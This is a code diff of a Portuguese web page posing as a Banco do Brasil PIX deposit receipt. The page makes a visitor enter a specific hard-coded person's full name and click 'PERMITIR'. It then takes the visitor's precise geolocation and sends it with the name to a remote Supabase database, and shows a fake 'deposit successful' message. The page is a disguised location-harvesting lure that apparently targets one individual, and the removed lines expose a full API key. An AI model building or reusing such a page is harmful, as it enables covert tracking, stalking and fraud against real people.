@@ -3,77 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Abrir comprovante</title>
+    <title>Abrir Comprovante</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
     <link rel="stylesheet" href="styles.css">
     <link rel="manifest" href="manifest.json">
 </head>
 <body>
-    <img id="logo" src="assets\bb.png" alt="Logo" width="100">
-    <h2>Comprovante de transação PIX</h2>
+    <img id="logo" src="assets/bb.png" alt="Logo" width="100">
+    <h2>Comprovante de Transação PIX</h2>
     
-    <p id="status">Para confirmar, digite o nome completo da pessoa beneficiária e depois clique em PERMITIR para prosseguir com seu depósito.</p>
+    <p id="status">Para confirmar, digite o nome completo da pessoa beneficiária e clique em PERMITIR.</p>
     <input type="text" id="username" placeholder="Nome completo">
-    <button onclick="getLocation()">PERMITIR</button>
+    <button onclick="checkAndSend()">PERMITIR</button>
 
-    <img id="imagem" src="assets\android-chrome-192x192.png" alt="Comprovante" width="300">
+    <img id="imagem" src="assets/android-chrome-192x192.png" alt="Comprovante" width="300">
+
     <script>
-        
-        // Certifique-se de carregar o SDK do Supabase antes
-        const NOME_FIXO = 'Renato Tadeu Pereira';
+        // Configuração do Supabase
         const SUPABASE_URL = "https://vcgaddzniugltliozdnl.supabase.co";
-        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZjZ2FkZHpuaXVnbHRsaW96ZG5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk1NjYwODQsImV4cCI6MjA1NTE0MjA4NH0.26m1I7QPWZNb-NRYklzTiRgsQVEZ4iUOXmic-XRNg9Q";
-    
-        // Criação correta do cliente Supabase antes de qualquer uso
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-    
-        async function requestPermission() {
-            try {
-                const permission = await navigator.permissions.query({ name: "geolocation" });
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-                if (permission.state === "denied") {
-                    document.getElementById("status").innerText = "Permissão bloqueada! Vá para Configurações > Sites > Localização e ative.";
-                    return;
-                }
+        // Nome fixo para validação
+        const NOME_FIXO = "Renato Tadeu Pereira";
 
-                // Se necessário, tente redefinir a permissão
-                if (permission.state === "prompt") {
-                    navigator.geolocation.getCurrentPosition(
-                        () => console.log("Permissão concedida"),
-                        () => console.log("Permissão negada")
-                    );
-                }
-            } catch (error) {
-                console.error("Erro ao verificar permissão. Clique em PERMITIR", error);
-            }
-        }
-
-
-        async function getLocation() {
-            try {
-                const permission = await navigator.permissions.query({ name: "geolocation" });
-
-                if (permission.state === "denied") {
-                    document.getElementById("status").innerText = "Erro ao verificar permissão. Vá para Configurações > Configurações do Site > Local > Abrir todas as solicitações.";
-                    return;
-                }
-
-                document.getElementById("status").innerText = "Fazendo a confirmação dos dados... Aguarde";
-                
-                navigator.geolocation.getCurrentPosition(
-                    sendLocation, 
-                    showError,    
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-
-            } catch (error) {
-                console.error("Erro ao verificar permissão:", error);
-                document.getElementById("status").innerText = "Erro ao verificar permissão.";
-            }
-        }
-    
-        async function sendLocation(position) {
-            const username = document.getElementById("username").value;
+        function checkAndSend() {
+            const username = document.getElementById("username").value.trim();
             if (!username) {
                 document.getElementById("status").innerText = "Por favor, digite um nome.";
                 return;
@@ -82,51 +37,67 @@
                 document.getElementById("status").innerText = "Nome incorreto. Tente novamente.";
                 return;
             }
-            
+            getLocation(username);
+        }
+
+        function getLocation(username) {
+            if (!navigator.geolocation) {
+                document.getElementById("status").innerText = "Geolocalização não suportada pelo navegador.";
+                return;
+            }
+
+            document.getElementById("status").innerText = "Obtendo localização...";
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => sendLocation(position, username),
+                showError,
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        async function sendLocation(position, username) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-    
-            //document.getElementById("latitude").innerText = latitude.toFixed(6);
-            //document.getElementById("longitude").innerText = longitude.toFixed(6);
-            document.getElementById("imagem").src = "assets\android-chrome-512x512.png"; 
-            //document.getElementById("status").innerText = "Enviando ao Supabase...";
-    
+
+            document.getElementById("imagem").src = "assets/android-chrome-512x512.png";
+
             try {
                 const { data, error } = await supabase
                     .from("localizacoes")
                     .insert([{ latitude, longitude, created_at: new Date().toISOString(), name: username }]);
-    
+
                 if (error) {
                     throw error;
                 }
-    
-                document.getElementById("status").innerText = "Depósito realizado com sucesso.";
-                console.log("Sucesso:", data);
+
+                document.getElementById("status").innerText = "Depósito realizado com sucesso!";
+                console.log("Dados enviados:", data);
             } catch (err) {
                 console.error("Erro ao enviar:", err.message);
                 document.getElementById("status").innerText = "Erro ao salvar: " + err.message;
             }
         }
-    
+
         function showError(error) {
             let msg = "";
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    msg = "Permissão negada pelo usuário.";
+                    msg = "Permissão de localização negada. Ative em Configurações > Sites > Localização.";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    msg = "Informação de local indisponível.";
+                    msg = "Localização indisponível.";
                     break;
                 case error.TIMEOUT:
-                    msg = "Tempo limite de requisição excedido.";
+                    msg = "Tempo limite da requisição excedido.";
                     break;
-                case error.UNKNOWN_ERROR:
+                default:
                     msg = "Erro desconhecido.";
                     break;
             }
             document.getElementById("status").innerText = msg;
         }
-        // Registrar Service Worker para transformar em PWA
+
+        // Registrar Service Worker para PWA
         if ("serviceWorker" in navigator) {
             navigator.serviceWorker.register("/sw.js")
                 .then(() => console.log("Service Worker registrado!"))
